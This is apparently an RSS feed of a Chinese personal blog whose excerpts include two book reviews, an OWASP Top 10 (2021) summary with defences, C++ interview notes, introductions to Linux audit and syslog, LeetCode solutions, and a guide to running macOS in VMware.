<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on XR_G&#39;s Blog</title>
    <link>https://xrg.fj.cn/post/</link>
    <description>Recent content in Posts on XR_G&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 10 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://xrg.fj.cn/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>再读《倚天屠龙记》</title>
      <link>https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%80%9A%E5%A4%A9%E5%B1%A0%E9%BE%99%E8%AE%B0/</link>
      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%80%9A%E5%A4%A9%E5%B1%A0%E9%BE%99%E8%AE%B0/</guid>
      <description>概言 《倚天屠龙记》是一部好作品。
距离上一篇读书小记已有半年多了，这半年并非全无读书，而是读了大部头而还未读完（《三国演义》），或者读了论述类的书（《乡土中国》）而尚未理解得很深刻，自然没有办法产出什么读书感想。
其实，我从以前就说我不大喜欢读小说，尤其是长篇小说，这点后面一定要讲讲。
言归正传，从我再一次翻开《倚天屠龙记》，到我看完最后一页而无比怅然，只花了三四天的时间。犹记得中学时期，学校总是强调不要看武侠小说，甚至在武侠小说之前加上了“沉迷”二字，俨然将其视为了一种猛烈上瘾的毒药；这几天下来，颇不认同。小说就是小说，小说都是写人物的、讲故事的，不应有“沉迷某某小说”这种针对性的表达。所谓“沉迷”，只能是作者把人物写得太生动了，把故事讲得太精彩了，使读者流连于小说的世界之中，但是既然如此，“沉迷”武侠小说，和“沉迷”四大名著、“沉迷”外国经典，也就没有多大的区别了。
我先说“沉迷”武侠小说的说法是错误的，但我这几天确实是“沉迷”了，沉迷在在这片快意恩仇的江湖里，甚至没有心思抽出身来打打游戏。
我想《倚天屠龙记》之精彩，其一在于“大情”和“小情”的调和，这是文意方面；其二在于金庸先生对人物的塑造，一个个角色都是有血有肉的，他们的嬉笑怒骂如在眼前，读者并不是以冷酷的第三者的身份来看完整篇故事，而是仿佛跟随在这些人物身边去目睹一切了。
中学时看过几遍《倚天屠龙记》，但年岁渐长，心境也不同往日。旧时的记忆只限于跟张无忌相关的部分，这次重读，半生半熟之间自然有新的感悟。
全书可以分为几个大的部分，张无忌成年以前的部分均为铺垫，张翠山和殷素素相识相恋、冰火岛等情节尤其精彩；张无忌回归中土之后，幼年时期的情节单列一部分，此时的无忌完成了从天真纯粹到初尝世事的转变，他父母的自尽、身受玄冥神掌之后被太师傅带着四处求医、蝴蝶谷的生活、带着不悔妹妹的漫漫西行之路、受了朱家的欺骗……身处乱世，这样的经历不可不谓命途多舛，但张无忌始终承受下来了，一次次的磨砺都带着一次次的机缘，与周芷若的相识、一身医术的修成，都在此时。
第三部分是光明顶解围。修成九阳神功之后，在光明顶结识小昭、练成乾坤大挪移、力服六大派，而成为明教教主。这部分是张无忌人生中的第一个高光，实则也是全书中“大情”的第一次体现：学武之人应当胸襟开阔，江湖各派应该精诚团结、共克外敌。光明顶一战，无人不服这一年轻而高尚的侠士。
第四部分是解救群雄。光明顶之后，蒙古势力介入捡漏，各大派人物为赵敏所擒。张无忌先到少林，后到武当，于武当山顶学会了太极，十分漂亮地解了一次围。而后万宁寺一战，救出群豪，也是精彩。这一部分，张无忌与赵敏相识，而后情愫暗生，成为全文“小情”的重要部分。这一部分是周芷若命运的转折点，由于灭绝师太心中那无法放下的成见，使得一位少女早早结束了她天真可爱的时期，而被迫修练城府，终于带来一场凌乱的冲突，十分可悲可叹。
第五部分是出海与归来。张无忌一行人前往灵蛇岛，在那岛上寻得谢逊、与波斯总教产生矛盾、与小昭东西永隔、回程时殷离身死、赵敏受冤……这部分是“小情”的主舞台，张无忌与四个女子之间剪不断理还乱的情感，使得我在看这一部分时相当痛苦。与波斯人的冲突最终还是稍逊一筹，小昭被迫成为总教教主，远赴波斯，从此永别（在小说中永别了），殷离身死、赵敏蒙冤，张无忌的情感聚焦到了周芷若和谢逊身上。我先前已说了，所谓“沉迷”其中，是指情节和语言精彩绝伦，使读者如同目睹一切，感受一切；然则我也亲历了张无忌与四女的情感波折，四段感情迫于外力一段段地终了，最终剩下与周芷若的情感，也没有一个清晰的界定，真是愁死人也。
第五部分是再回中土之后，与周芷若的冲突、与赵敏的重逢、多次营救谢逊、共抗元兵、携手归隐。这部分是文章的最后一部分，也是“大情”和“小情”的高潮。在这部分，张无忌将“小情”理出了头绪，即先义父、后男女，主赵敏、副他人。为救义父，不惜与赵敏一同离开婚礼现场，与周芷若彻底冲突；而随着营救进程的发展，无忌也认清了自己心中真正所爱的角色是赵敏。这部分是全文中第二次聚集天下英杰，元兵的到来也使得武林人士精诚团结、共抗外敌，是“大情”的又一次集中表达。
大情 我认为一篇小说当中不应该只有小情。
这里的大情，是指对人物关系之外的、更高一级的问题的思考和体现。《倚天屠龙记》当中至少体现了两个深刻的问题：
 正与邪的对立统一。 主与次的矛盾冲突。  从张翠山和殷素素的关系开始，就在表达一个问题：正与邪是绝对对立的吗？殷素素是天鹰教的公主，原本杀人不眨眼，但为情所动，成为了一个温柔的妻子、温柔的母亲，这样的人，能称之为邪吗？
谢逊的转变，赵敏的转变，均是邪转为正的例子；何太冲原本也是一派掌门，贪念一起，便始终纠结于谢逊与屠龙刀，甚至于光明顶偷袭失败而刺死了华山派掌门、夜晚私闯关押谢逊的地方而被渡劫三人击败、被成昆杀死，这是正转为邪的例子。其实，书中的人物均是灰度的，以正邪为白黑，张三丰和成昆为两个极端的人物，其余人物几乎都亦正亦邪。张无忌一身正气，也难免对四女贪心不足，情感纠缠不清，是大正而小邪；赵敏是害苦了俞岱岩等人的幕后黑手，而也难逃男女之情的影响，向张无忌代表的正方靠拢过去；明教诸人更不必提，总是以邪魅手段行正义之事，倒也有趣。
主与次的矛盾冲突是另一个大问题。文章的背景是元末，主要矛盾其实是朝廷与百姓、与江湖群侠的冲突，其余江湖各派、派内各种人物的冲突，是次要的。但是全文基本以次要矛盾为核心，没有过多地呈现当时的主要矛盾，或者说主要矛盾只存在于诸人的豪言壮语中，这是受到了题材的限制。讲带兵打仗、驱除胡虏，不讲内功外劲、江湖恩怨，这武侠小说便没东西可写。但是在次要矛盾之中，处处体现主要矛盾，各派之间争斗之时，总有人试图将这些斗争消融掉，呼吁各方团结起来对付元朝；在朱元璋对张无忌施压的内部斗争情节中，也有人呼吁以抗击外虏为主。最后各方终于团结在少室山上，共同抵御元兵，是次要矛盾转向主要矛盾的一次升华。
主次矛盾在各方的视角当中是不一样的。从第三者视角来看，当然是恢复失地、推倒暴虐的朝廷为要；代入各派中的人物来看，主要矛盾却是杀害师兄弟的不共戴天之仇敌，这也无可厚非。着眼大局、放下私人恩怨是一种修为，不能强调所有人都要有这种修为，这种局部视角下的主要矛盾其实是灭绝师太身死、周芷若悲剧的一个重要成因。
其实，正与邪的对立统一也应当属于诸多矛盾中的一种。我在这里说的第一点强调的是“对立和统一”，第二点强调的是“主要和次要”，并不属于重复。
至于从前的阅读理解题里面常常说的“歌颂了人物的某某性格”、“反映了某某高贵品质”云云，但凡成点气候的小说，便不会不突出人物的性格品质，写在这里是浪费笔墨。
小情 小情实则不小，相反，乃是使人物丰满之关键。没有小情，小说里写出来的便是木头而不是人了，但相比于宏观的、较大的问题，人物身上所系的一些情感，只能称之为小情。
《倚天屠龙记》的后记当中讲到，这一部小说主要强调的不是男女之情，而是江湖当中的好友、师长之情。在我读来，其实二者的含量是差不多的，好友、师长之情描述虽多，而其味不浓，男女之情虽然一直并不直接地表达出来，但寥寥几个情节便令人如饮烈酒，思绪无穷。
好友、师长之情确实是一大重点。张无忌和太师傅、和明教当中的教众、和谢逊，都有非常不一般的情谊，张三丰和张翠山、或者武当七侠之间的情感，亦不逊色。男人是很向往这样的情感的，而武侠小说所描绘的这类情感很多，因此在固有的印象中，学生时期痴迷于武侠小说的群体中还是男生较为多一些。
男女之情的部分则当真是千回百转。张翠山和殷素素好一对天作之合！张无忌和小昭、赵敏、周芷若，殷离和她心中的那个小鬼……这一类感情真是非常复杂，无论是喜是悲读起来都使人非常惆怅。寻常作品当中写男女之情，能有一二缕复杂关系，便叫人难以把持，而书中若干对男女被金庸先生刻画得如此生动，不愧是一代大师。
我想在这一部分中，谈谈我对这部作品的总体感受和一些其他的联想。
此前已讲过，《倚天屠龙记》是大情和小情交融在一起的，恰如那阴阳并济的九阳真气那样，很醇厚。小说是要有这样的水平，才堪称好作品；《三国演义》如没有始终怀抱“兴复汉室、还于旧都”愿望的蜀汉，便是三派军阀混战，无甚特别的魅力，这部作品中凌驾于个人之上的大情是家国情怀、君臣之义。读者总是希望从作品中读出一些情节之外的东西，如此感悟才深、回味才隽永。
小说是以小情结尾的，周芷若要求张无忌不跟赵敏拜堂成亲，但不反对他们做夫妻，原文写道：
 张无忌奇道：“你这样跟我们为难，有什么用意？”周芷若嫣然一笑，说道：“你们尽管做夫妻、生娃娃，过得十年八年，你心里就只会想着我，就只不舍得我，这就够了。”说着身形晃动，飘然远去，没入黑暗之中。
 这样作为落幕，好不厚道，留下的空间实在太大，回味实在太多；我昨晚读完全书，犹如饮下一杯极苦极苦的浓茶，一直到深夜都还辗转反侧，全放不下对这几个人的牵挂，讲不清是一种什么感觉。
很开始的时候便说：我是比较不喜欢读小说，尤其是长篇小说的。我们既然要读书，便该读佳作，既是佳作，便是其中一个微不足道之人物，也被作者用深厚的功底刻画得栩栩如生，更休提主角。读完一本长篇小说，便是与主角一道生活了好几天，想主角之所想，见主角之所见，他的喜怒哀乐只在眼前，对这个人物的情感已是很深；读完全本，合上书页，这个人物便是“飘然远去，没入黑暗之中”，于我来说，不是读完了一本书，而是失去了一个极好的朋友，怅怅然不知所措。“早知如此绊人心，何如当初莫相识”，正是我不喜欢读长篇小说的原因了。</description>
    </item>
    
    <item>
      <title>OWASP Top10（2021）</title>
      <link>https://xrg.fj.cn/p/owasp-top102021/</link>
      <pubDate>Wed, 29 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/owasp-top102021/</guid>
      <description>2021版本的OWASP Top10已经出炉，目前处于同行评审阶段。本博客上已有2017版本的归纳总结，考虑到后面几年时间内，该版本（2021版）的Top10将可能对行业产生较大的影响，现单列一篇，总结其内容。
 截至本文发布，该版本已经定稿
 0 总览 新版本相较于2017版，引入了3个新类别（Insecure Design、Software and Data Integrity Failures、SSRF），修改了原有4个类的名称，以及进行了一些类别的整合。
变化
这一版Top10综合考虑了大数据和行业调查的结果；由于安全人员需要对大数据分析得到的漏洞进行验证和测试，为了保证结论的与时俱进，该机构对一线安全人员进行了问卷调查，由他们来对大数据分析的结果进行补充。
1 Broken Access Control 失效的访问控制 是原榜单的 No. 5 ，现在来到了第一位。在 秋招 | 一些知识点 (gitee.io) 这篇文章中已经对这一安全问题进行了解释，在此不妨再重复一遍。
访问控制策略使得所有用户都只能在其对应的权限之下行动，而失效的访问控制将导致未授权信息的读取、修改、销毁，或导致用户执行其权限之外的功能函数。一般的访问控制漏洞包括以下几点：
 攻击者可以通过修改URL、应用内部状态、HTML页面或使用API攻击工具来绕过访问控制检查； 允许攻击者将数据库主键设置为其他用户，从而导致查看或修改其他用户的信息； 提权。未登录时能够执行已登录用户的操作，或已登录用户执行管理员操作； 修改元数据，例如JSON Web Token（JWT）的重放或伪造，cookie或隐藏元数据字段的伪造，从而进行提权； CORS（跨域资源共享）配置不当，从而导致未授权的API调用； 在未登录状态下通过目录遍历找到了需要登录才能访问的界面，或同理找到了管理员界面。  防护措施 ：
 只开放公共资源，其余资源默认禁止访问； 只实现一种访问控制机制，贯彻落实到整个应用中； 访问控制模型要明确每一条记录的拥有者，不允许用户随便创建、读取、更新、删除记录； 记录失败的访问控制，并及时告警。  2 Cryptographic Failures 密码算法失效 旧称 敏感数据泄露 ，是原榜单的 No. 3 ，现在来到了第二位。敏感数据泄露是现象而非本质，新版本将其表达修改为更加接近问题根源的形式。
人们总是需要考虑数据传输、存储、处理过程中的保护需求，诸如口令、信用卡号、个人信息等数据需要提供额外的保护；一般来说，只要是法律规定的敏感数据都需要进行严密的保护。参照欧盟的GDPR、金融业的PCI DSS等文件，数据保护要考虑如下的问题：
 数据明文明文传输问题； 在默认配置或较老的代码中使用了脆弱的密码算法； 使用了默认的/脆弱的/重复使用的密钥，或密钥没有得到妥善的保管； 没有强制进行加密； 客户端没有对服务端证书进行验证。  防护措施 ：</description>
    </item>
    
    <item>
      <title>秋招 | 一些知识点</title>
      <link>https://xrg.fj.cn/p/%E7%A7%8B%E6%8B%9B-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/</link>
      <pubDate>Sun, 29 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E7%A7%8B%E6%8B%9B-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/</guid>
      <description>2021-07-20，正式拉开了秋招备战的序幕。
我一直以来都深以为然的一个句子是，人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。 这个句子的意思是，如果你的学习能力比不上他人，那就花费百倍的精力去学，能够做到这一点的人，即使是一个愚者，也能够明了很多的知识。
1 C++引用和指针的区别 这个问题出现在昨天的面试中，在此予以学习和记录。
指针： 指针是一个变量，用于保存另一个变量的地址。指针需要使用 * 来进行解引用，以获取它指向的内存地址上的内容。
引用： 引用是一个 已经存在 的变量的别名，实际上，引用也是通过存储变量的地址来进行实现的。
两者的区别有如下几点：
  初始化的方式不同。指针可以先声明，后赋值；引用必须在声明的同时进行初始化，因为它必须作为一个已经存在的变量的别名。
  重复赋值。指针可以重复赋值（当然，const指针不行），而引用一旦声明，就不可以重复赋值。
  内存占用。指针在栈上有其独立的内存空间（32bit机器就占用4字节），而引用与它的初始变量共享同一个空间，虽然它还是会花掉一部分栈空间。
  是否为空。指针可以设置为NULL，而引用不行（基于第一点和第二点区别）。
  间接引用。指针可以有多重嵌套，而引用不行。
In Pointers, int a = 10; int *p; int **q; //it is valid. p = &amp;amp;a; q = &amp;amp;p; // Whereas in references,  int &amp;amp;p = a; int &amp;amp;&amp;amp;q = p; //it is reference to reference, so it is an error.</description>
    </item>
    
    <item>
      <title>audit 简述</title>
      <link>https://xrg.fj.cn/p/audit-%E7%AE%80%E8%BF%B0/</link>
      <pubDate>Wed, 25 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/audit-%E7%AE%80%E8%BF%B0/</guid>
      <description>什么是audit Linux下的audit框架提供可靠的搜集系统信息的服务，任何与安全相关（或无关）的事件都可被此框架搜集和审计。通过audit，人们可以更加详细地了解系统上发生的事情，然而，该框架并不提供额外的安全措施，在安全事件中，它仅仅是帮助人们更加清晰地认识整个事件的始末，此后亡羊补牢，为时未晚。
简单地说，audit审计框架的工作就是监听来自内核的事件报告，并将它们写入日志文件中。
而较为系统地说，audit框架的组件结构如图所示：
img
安装 内核层的audit服务在Linux（4.18及以后）、Linux-lts（4.19及以后）、Linux-zen（4.18及以后）和Linux-hardened等版本中默认可用。如用户使用自行编译的内核，需要在编译中设置参数 CONFIG_AUDIT 。
我们通过查看内核编译参数，可以看到系统对audit内核审计的支持情况，以CentOS 7为例：
img
用户层的audit服务可以通过普通的软件安装方式获取，可以使用 systemctl 或 service 命令来控制服务的启停。
audit内核审计的消息可以由应用或系统活动来触发，而 audit daemon（audit守护进程） 是audit框架中的重要组成部分，它负责处理内核生成的消息，例如将这些消息写入日志中或选择性地忽略。
我们可以通过若干命令和文件来控制 audit daemon ：
 auditctl ：直接控制守护进程的行为，如添加规则等； /etc/audit/audit.rules ：内含audit守护进程的规则和各种变量； aureport ：生成系统活动的审计报告； ausearch ：在审计日志中对各类事件进行搜索； auditspd ：用于将事件消息通知给其他应用的守护进程，有了此进程，事件就不需要通过磁盘上的audit日志来进行传递了； autrace ：用于追踪某一进程的命令，类似 strace ； etc/audit/auditd.conf ：关于日志记录的配置文件。  添加规则 基础 注意，audit框架对事件的审计是全面而细致的，添加规则之前，我们需要对规则有充分的认知，否则，可能仅仅由于一条规则，我们的日志文件就被瞬间写满了。
audit规则的加载可以通过命令行工具 auditctl 或使用命令 auditctl -R /etc/audit/audit.rules 从规则文件中批量读取。
通过 auditctl 命令添加的规则会在系统重启之后丢失。如希望使规则持续生效，就将它们写入 /etc/audit/audit.rules 文件中，通过命令 rcauditd resatrt 重启audit服务使规则文件生效。
对文件和目录访问的审计 监控某一特定文件的访问行为属于audit框架的基础用法。使用 -w 选项（表示”watch“）来指定你要监控的文件或目录。最常见的规则是监控对 passwd 文件的访问：</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode1713. 得到子序列的最少操作次数</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1713.-%E5%BE%97%E5%88%B0%E5%AD%90%E5%BA%8F%E5%88%97%E7%9A%84%E6%9C%80%E5%B0%91%E6%93%8D%E4%BD%9C%E6%AC%A1%E6%95%B0/</link>
      <pubDate>Mon, 02 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1713.-%E5%BE%97%E5%88%B0%E5%AD%90%E5%BA%8F%E5%88%97%E7%9A%84%E6%9C%80%E5%B0%91%E6%93%8D%E4%BD%9C%E6%AC%A1%E6%95%B0/</guid>
      <description>题目 给你一个数组 target ，包含若干 互不相同 的整数，以及另一个整数数组 arr ，arr 可能 包含重复元素。
每一次操作中，你可以在 arr 的任意位置插入任一整数。比方说，如果 arr = [1,4,1,2] ，那么你可以在中间添加 3 得到 [1,4,3,1,2] 。你可以在数组最开始或最后面添加整数。
请你返回 最少 操作次数，使得 target 成为 arr 的一个子序列。
一个数组的 子序列 指的是删除原数组的某些元素（可能一个元素都不删除），同时不改变其余元素的相对顺序得到的数组。比方说，[2,7,4] 是 [4,2,3,7,2,1,4] 的子序列（加粗元素），但 [2,4,2] 不是子序列。
示例1
 输入： target = [5,1,3], arr = [9,4,2,3,4] 输出： 2 解释： 你可以添加 5 和 1 ，使得 arr 变为 [5,9,4,1,2,3,4] ，target 为 arr 的子序列。  示例2
 输入： target = [6,4,8,1,3,2], arr = [4,7,6,2,3,8,6,1] 输出： 3  数据范围</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode面试题 08.13. 堆箱子</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode%E9%9D%A2%E8%AF%95%E9%A2%98-08.13.-%E5%A0%86%E7%AE%B1%E5%AD%90/</link>
      <pubDate>Sat, 17 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode%E9%9D%A2%E8%AF%95%E9%A2%98-08.13.-%E5%A0%86%E7%AE%B1%E5%AD%90/</guid>
      <description>这道题有点难，但并不是完全难。
题目 堆箱子。给你一堆n个箱子，箱子宽 wi、深 di、高 hi。箱子不能翻转，将箱子堆起来时，下面箱子的宽度、高度和深度必须大于上面的箱子。实现一种方法，搭出最高的一堆箱子。箱堆的高度为每个箱子高度的总和。
输入使用数组 [wi, di, hi]表示每个箱子。
示例1
 输入： box = [[1, 1, 1], [2, 2, 2], [3, 3, 3]] 输出： 6  示例2
 输入： box = [[1, 1, 1], [2, 3, 4], [2, 6, 7], [3, 4, 5]] 输出： 10  数据范围
 箱子的数目不大于3000个。  分析 箱子有三个维度，一瞬间就让人想到了三维的DP。
能否降低循环层数呢？我们注意到题目中所说的 下面箱子的宽度、高度和深度必须大于上面的箱子 ，那么，只需要根据任意一个维度进行排序，最终箱子叠起来的顺序就是排序后的顺序（正序或反序）。
更具体地说，假如我们以宽度 w 为参照进行降序排序，则当 i &amp;lt; j 时，第 i 个箱子 一定 在第 j 个箱子下面（如果它们都被选中的话），因为第 i 个箱子的宽度更大。</description>
    </item>
    
    <item>
      <title>syslog机制简述</title>
      <link>https://xrg.fj.cn/p/syslog%E6%9C%BA%E5%88%B6%E7%AE%80%E8%BF%B0/</link>
      <pubDate>Sat, 03 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/syslog%E6%9C%BA%E5%88%B6%E7%AE%80%E8%BF%B0/</guid>
      <description>断更了将近两个月？
五月下旬开始参加实习，工作颇为忙碌，单程一小时的通勤也磨灭了我回到宿舍之后继续学习和输出的热情；然而实习已近两月，所幸稍有所得，不做记录则恐愧对时光矣。
syslog工作流程简述 不管是什么应用，日志机制永是最重要的机制之一，从日志中，维护人员可以排查错误、发现攻击，从而有效地提高应用的可用性。
操作系统也是如此，本文将对Linux日志机制中的一个重要组成部分——syslog/rsyslog——进行一个简要的叙述。
大部分Linux发行版默认的日志守护进程为syslog（或较新版本的rsyslog），位于 /etc/syslog 或 /etc/syslogd 或 /etc/rsyslog.d ，默认配置文件为 /etc/syslog.conf 或 rsyslog.conf ，任何希望生成日志的程序都可以向syslog发送信息。
syslog应该对接收的信息进行某种处理。我们可以从直觉出发，考虑一下syslog收到一条信息后应该做哪些事情：首先，系统中有那么多的信息源，我们会考虑对这些信息源进行分类；之后，每个信息源给出的信息都具有不同的情境，正常运行产生的信息跟报错信息肯定不能一视同仁的，我们会考虑根据信息的严重性对这些信息进行分类；最后，符合筛选条件的信息就触发某种动作，比如把它写进某个日志文件里。
流程图是个好东西。我们假设系统中有若干类信息源，每类信息源产生不同等级的信息，那么syslog应该对这些信息进行分类分级处理，如下图所示：
syslog处理分类分级处理信息
当然，这一流程图只是为了较为直观地呈现syslog分类分级的机制，以使读者有个初步的印象，接下来，我们将从配置文件出发，介绍syslog（rsyslog）的日志记录细节。
过滤规则 如果你的系统是CentOS，可以打开 /etc/rsyslog.conf ，这是syslog的配置文件，Ubuntu下的配置文件位于 /etc/rsyslog.d/50-default.conf ；在这里，你可以看到不少类似下方的语句：
authpriv.* /var/log/secure
这是syslog日志记录的一条规则，我们将规则拆开来看，实际上只有三个部分：
规则的组成
第一个部分是facility（设备类型），第二个部分是priority（优先级/严重性），第三个部分是action（动作）。
你应该能够想到，这一条规则就描述了上文所说的对消息进行分类分级处理的过程！
仔细看看配置文件吧，每一条规则都是如此的简单而实用：
#### RULES #### # Log all kernel messages to the console. # Logging much else clutters up the screen. #kern.* /dev/console # Log anything (except mail) of level info or higher. # Don&amp;#39;t log private authentication messages!</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode363. 矩形区域不超过 K 的最大数值和</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode363.-%E7%9F%A9%E5%BD%A2%E5%8C%BA%E5%9F%9F%E4%B8%8D%E8%B6%85%E8%BF%87-k-%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E5%80%BC%E5%92%8C/</link>
      <pubDate>Fri, 07 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode363.-%E7%9F%A9%E5%BD%A2%E5%8C%BA%E5%9F%9F%E4%B8%8D%E8%B6%85%E8%BF%87-k-%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E5%80%BC%E5%92%8C/</guid>
      <description>难题本为数不多的Hard题~
题目 给你一个 m x n 的矩阵 matrix 和一个整数 k ，找出并返回矩阵内部矩形区域的不超过 k 的最大数值和。
题目数据保证总会存在一个数值和不超过 k 的矩形区域。
示例1

 输入： matrix = [[1,0,1],[0,-2,3]], k = 2 输出： 2 解释： 蓝色边框圈出来的矩形区域 [[0, 1], [-2, 3]] 的数值和是 2，且 2 是不超过 k 的最大数字（k = 2）。  示例2
 输入： matrix = [[2,2,-1]], k = 3 输出： 3  数据范围
 m == matrix.length n == matrix[i].length 1 &amp;lt;= m, n &amp;lt;= 100 -100 &amp;lt;= matrix[i][j] &amp;lt;= 100 -105 &amp;lt;= k &amp;lt;= 105  分析 我们要得到每一个小矩形，则可以：</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode1473. 粉刷房子 III</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1473.-%E7%B2%89%E5%88%B7%E6%88%BF%E5%AD%90-iii/</link>
      <pubDate>Tue, 04 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1473.-%E7%B2%89%E5%88%B7%E6%88%BF%E5%AD%90-iii/</guid>
      <description>愉快的五四青年节从遇到一道Hard的动态规划题结束~
题目链接：1473. 粉刷房子 III - 力扣（LeetCode） (leetcode-cn.com)
题目 在一个小城市里，有 m 个房子排成一排，你需要给每个房子涂上 n 种颜色之一（颜色编号为 1 到 n ）。有的房子去年夏天已经涂过颜色了，所以这些房子不需要被重新涂色。
我们将连续相同颜色尽可能多的房子称为一个街区。（比方说 houses = [1,2,2,3,3,2,1,1] ，它包含 5 个街区 [{1}, {2,2}, {3,3}, {2}, {1,1}] 。）
给你一个数组 houses ，一个 m * n 的矩阵 cost 和一个整数 target ，其中：
houses[i]：是第 i 个房子的颜色，0 表示这个房子还没有被涂色。 cost[i][j]：是将第 i 个房子涂成颜色 j+1 的花费。 请你返回房子涂色方案的最小总花费，使得每个房子都被涂色后，恰好组成 target 个街区。如果没有可用的涂色方案，请返回 -1 。
示例1
 输入： houses = [0,0,0,0,0], cost = [[1,10],[10,1],[10,1],[1,10],[5,1]], m = 5, n = 2, target = 3 输出： 9 解释： 房子涂色方案为 [1,2,2,1,1]，此方案包含 target = 3 个街区，分别是 [{1}, {2,2}, {1,1}]。涂色的总花费为 (1 + 1 + 1 + 1 + 5) = 9。  示例2:</description>
    </item>
    
    <item>
      <title>尝尝鲜——为自己装一台Mac OS虚拟机</title>
      <link>https://xrg.fj.cn/p/%E5%B0%9D%E5%B0%9D%E9%B2%9C%E4%B8%BA%E8%87%AA%E5%B7%B1%E8%A3%85%E4%B8%80%E5%8F%B0mac-os%E8%99%9A%E6%8B%9F%E6%9C%BA/</link>
      <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E5%B0%9D%E5%B0%9D%E9%B2%9C%E4%B8%BA%E8%87%AA%E5%B7%B1%E8%A3%85%E4%B8%80%E5%8F%B0mac-os%E8%99%9A%E6%8B%9F%E6%9C%BA/</guid>
      <description>如果你单纯地想体验一下以“简洁高效“闻名的Mac OS，那么我会强烈推荐你为自己创建一台Mac OS的虚拟机，使用这种方法，你不需要花费大几千元去购入一台Mac Book，就能得到最完整的系统体验。当然，假若你在体验之后爱上了这款系统，之后努力工作为自己的情怀买个单也是有所必要的。
解锁VMWare 我们诸多步骤中最困难的一步就是解锁VMWare了。为什么叫解锁呢？因为我们使用的程序被作者命名为 unlocker ，就这么简单······ 我假定阅读本文的读者已经知道什么是VMWare，并且创建过自己的虚拟机，对于VMWare的安装等流程不再赘述。本文使用的是VMWare Workstation Pro 16 。
正常的VMWare在创建虚拟机的时候，需要选择虚拟机操作系统，而且只有简单的几个选项（Windows/Linux/···）。我们在选项列表中看不到 apple MacOS 这类的字眼，因此我们要做的第一件事就是让VMWare能够创建 Mac OS 类型的虚拟机。 这一步真是非常的简单啊。总体而言，我们只需要进行三个步骤：
 下载 unlocker 软件 软件运行之前做一些前期的准备 运行！  Amazing，看起来一点都不难吧？
Step1 我们去 这个网址 下载所需要的软件。
对应于本文所使用的VMWare 16，你可以有两种选择：
 Auto-Unlocker v1.1.3 以一个 exe 的形式封装好了所有的流程，在我的测试中，这个软件总是不能成功解锁VMWare，令人生气。 根据某个 issue 中的办法，去 这里 下载另一个版本的 unlocker ，兄弟，这个办法真的管用！  使用第二个办法，下载的文件解压之后大概是这样的： unlocker files 相信你能自己找到 win-install.cmd 这个文件，对吧？
Step2 现在先不要急着运行，我们需要做一些运行之前的准备。
打开任务管理器，首先杀掉跟VMWare有关的进程，它们一般都以 VM- 这样的格式开头。
然后进入到任务管理器的【服务】面板，停止跟VMWare有关的服务，如 VMNetDHCP 等，它们的格式也都以 VM- 开头。
不用担心服务没有关干净，或者进程杀不掉的问题。理论上我们的 unlocker 能够自动关掉这些服务，等到解锁完毕之后再启动它们。我在这里啰嗦这些，主要是忠实地记录我的实践结果，如果你运气好的话，跳过这一步最终也是可能成功的。</description>
    </item>
    
    <item>
      <title>再读《偷影子的人》</title>
      <link>https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%81%B7%E5%BD%B1%E5%AD%90%E7%9A%84%E4%BA%BA/</link>
      <pubDate>Tue, 27 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%81%B7%E5%BD%B1%E5%AD%90%E7%9A%84%E4%BA%BA/</guid>
      <description>《偷影子的人》是一部好作品。
人的一生会面对很多种情感，很大一部分是不可言传的。然而，法国人马克·吕维用他的简明而精巧的设计、温馨而幽默的笔触将一些宏大的、复杂的情感呈现在读者面前了。
《偷影子的人》确实是一部好作品。
 小男孩有一个特殊的能力——与影子对话。当他的影子与别人的影子贴到一起，他可以从别人的影子那里听到影子主人的秘密；当别人的影子挤占了自己影子的位置时，别人的影子就被小男孩“偷”走了。
人，总是有很多的秘密，潜藏内心的渴望、不愿想起的哀伤······得益于“偷”影子的能力，小男孩能够从最清晰的角度与人交往，一切都是纯粹的，除了自己的内心。
友情 小男孩的第一个朋友是学校的警卫伊凡。
